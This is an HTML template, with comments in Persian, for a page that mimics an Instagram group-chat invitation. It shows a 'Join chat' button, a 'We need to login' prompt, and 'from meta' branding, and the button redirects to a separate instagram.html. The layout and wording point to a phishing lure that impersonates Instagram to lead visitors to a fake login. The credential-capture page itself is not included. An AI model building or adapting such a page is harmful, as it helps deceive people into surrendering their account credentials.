<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>Instagram • Group Chat</title>
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            height: 100%;
            min-height: 100vh;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #000000;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            max-width: 420px;
            width: 100%;
            background: #000000;
            border: 1px solid #2f2f2f;
            border-radius: 16px;
            overflow: hidden;
            display: flex;
            flex-direction: column;
            justify-content: center;  /* ← وسط‌چین عمودی */
            align-items: center;
            padding: 32px 20px 20px 20px;
            min-height: 500px;
        }

        /* ===== PROFILE SECTION ===== */
        .profile-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
            padding: 8px 0 4px 0;
            width: 100%;
        }

        .avatar-container {
            width: 96px;
            height: 96px;
            margin-bottom: 14px;
        }

        .avatar {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            overflow: hidden;
            border: 3px solid #2f2f2f;
        }

        .avatar img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        /* ====== تغییر عکس ====== */
        /* آدرس زیر را با عکس خودت جایگزین کن */
        /* مثال: src="my-photo.jpg" یا src="https://example.com/photo.jpg" */
        /* ======================= */

        .group-name {
            color: #ffffff;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 2px;
        }

        .member-count {
            color: #8e8e8e;
            font-size: 14px;
            margin-bottom: 20px;
        }

        .join-btn {
            background: #0095f6;
            color: #ffffff;
            border: none;
            padding: 10px 32px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 15px;
            cursor: pointer;
            transition: background 0.15s;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            width: fit-content;
            margin: 0 auto;
        }

        .join-btn:hover {
            background: #1877f2;
        }

        /* ===== FOOTER ===== */
        .footer {
            margin-top: 20px;
            padding-top: 20px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 2px;
            width: 100%;
        }

        .footer .download {
            color: #8e8e8e;  /* ← خاکستری */
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
        }

        .footer .download:hover {
            color: #a0a0a0;
            text-decoration: underline;
        }

        .footer .meta {
            display: flex;
            align-items: center;
            gap: 6px;
            color: #8e8e8e;
            font-size: 11px;
        }

        .footer .meta i {
            font-size: 12px;
            color: #8e8e8e;
        }

        .footer .meta .from-text {
            color: #8e8e8e;
        }

        .footer .meta .meta-text {
            font-weight: 600;
            color: #a0a0a0;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            body {
                padding: 0;
            }
            .container {
                border-radius: 0;
                border: none;
                min-height: 100vh;
                padding: 24px 16px 12px 16px;
            }
            .avatar-container {
                width: 80px;
                height: 80px;
            }
            .group-name {
                font-size: 18px;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Profile Section (بدون هدر) -->
        <div class="profile-section">
            <!-- ===== عکس پروفایل ===== -->
            <!-- لینک زیر را با عکس خودت عوض کن -->
            <div class="avatar-container">
                <div class="avatar">
                    <img src="ssa.jpeg" alt="Group avatar" id="groupAvatar">
                </div>
            </div>

            <div class="group-name">𝐿𝑜𝑣𝑒𝑟’𝑠 🦢</div>
            <div class="member-count">12.7K members</div>

            <button class="join-btn" id="joinBtn">
                <i class="fas fa-user-plus"></i> Join chat
            </button>
        </div>

        <!-- Footer -->
        <div class="footer">
            <div class="download">We need to login</div>
            <div class="meta">
                <i class="fab fa-instagram"></i>
                <span class="from-text">from</span>
                <span class="meta-text">meta</span>
            </div>
        </div>
    </div>

    <script>
        // ===== کلیک روی Join Chat =====
        document.getElementById('joinBtn').addEventListener('click', function() {
            // هدایت به صفحه instagram.html
            window.location.href = 'instagram.html';
        });
    </script>

</body>
</html>
